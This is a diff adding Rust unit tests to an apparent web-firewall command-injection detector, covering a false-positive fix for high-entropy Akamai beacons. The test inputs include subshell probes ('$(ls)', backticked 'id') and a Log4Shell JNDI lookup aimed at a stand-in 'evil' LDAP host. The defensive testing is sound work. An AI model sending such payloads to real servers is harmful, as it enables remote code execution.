@@ -804,4 +804,55 @@ mod tests {
         let req = make_view(&m, &u, &h, &b);
         assert!(d.inspect(&req).is_empty(), "baseline cmdi in cookie must not fire");
     }
+
+    // 320-char high-entropy base64url blob → entropy ≈ 6 bits/char.
+    fn beacon_blob() -> String {
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+            .chars()
+            .cycle()
+            .take(320)
+            .collect()
+    }
+
+    #[test]
+    fn text_plain_sensor_beacon_with_stray_subshell_is_skipped() {
+        // 2026-06-18 round-2 FP: Akamai `sensor_data` text/plain beacons
+        // carry stray `$(ls)` / `` `id` `` subshell shapes inside a 5 KB
+        // high-entropy blob (`` ` ``/`$(` appear by chance). The opaque-
+        // beacon gate must skip them — bot telemetry, not injection surface.
+        let d = CommandInjectionDetector;
+        let body = format!("{{\"sensor_data\":\"{}q`id`w$(ls)e\"}}", beacon_blob());
+        let (m, u, h, b) = body_view(Some("text/plain;charset=UTF-8"), &body);
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            d.inspect(&req).is_empty(),
+            "text/plain sensor beacon must be skipped",
+        );
+    }
+
+    #[test]
+    fn real_cmdi_in_normal_text_body_still_fires() {
+        // Same subshell in a short, low-entropy text body → NOT a beacon →
+        // still scanned and blocked.
+        let d = CommandInjectionDetector;
+        let (m, u, h, b) = body_view(Some("text/plain"), "please run `id` now");
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            !d.inspect(&req).is_empty(),
+            "real cmdi in a normal text body must still fire",
+        );
+    }
+
+    #[test]
+    fn log4shell_in_text_plain_beacon_still_fires() {
+        // A padded log4shell payload keeps the high-specificity fast-path.
+        let d = CommandInjectionDetector;
+        let body = format!("{}${{jndi:ldap://evil/a}}", beacon_blob());
+        let (m, u, h, b) = body_view(Some("text/plain"), &body);
+        let req = make_view(&m, &u, &h, &b);
+        assert!(
+            !d.inspect(&req).is_empty(),
+            "log4shell payload must fire even inside a high-entropy body",
+        );
+    }
 }
